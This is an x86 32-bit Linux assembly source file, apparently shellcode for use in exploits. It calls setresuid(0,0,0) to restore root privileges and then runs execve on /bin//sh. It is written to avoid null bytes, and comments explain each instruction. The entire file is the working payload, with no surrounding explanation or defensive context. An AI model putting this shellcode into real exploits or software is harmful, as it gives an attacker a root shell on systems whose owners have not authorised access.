.code32
.globl _start
.section .text

_start:
	#movl	$0xcccccccc, %eax
	#movl	$0xcccccccc, %ebx
	#movl	$0xcccccccc, %ecx
	#movl	$0xcccccccc, %edx
	#movl	$0xcccccccc, %esi
	#movl	$0xcccccccc, %edi
	#movl	$0xcccccccc, %ebp

	xorl	%eax, %eax			# eax = 0
	movb	$164, %al			# eax = 164
	xorl	%ebx, %ebx			# ebx = 0
	xorl	%ecx, %ecx			# ecx = 0
	cltd						# edx = 0
	int		$0x80				# setresuid(0, 0, 0), Revive root privileges.
	pushl	$11					# if setresuid fails, -1 will be returned, so it is not possible to write movb $11, %al.
	popl	%eax				# eax = 11
	pushl	%edx				# null character
	pushl	$0x68732f2f			# //sh
	pushl	$0x6e69622f			# /bin
	movl	%esp, %ebx			# ebx(argv[0]) = "/bin//sh"
	pushl	%edx				# null pointer
	movl	%esp, %edx			# edx(envp) = {NULL}
	pushl	%ebx				# "/bin//sh"
	movl	%esp, %ecx			# ecx(argv) = {"/bin//sh", NULL}
	int		$0x80				# execve("/bin//sh", ["/bin//sh", NULL], [NULL])
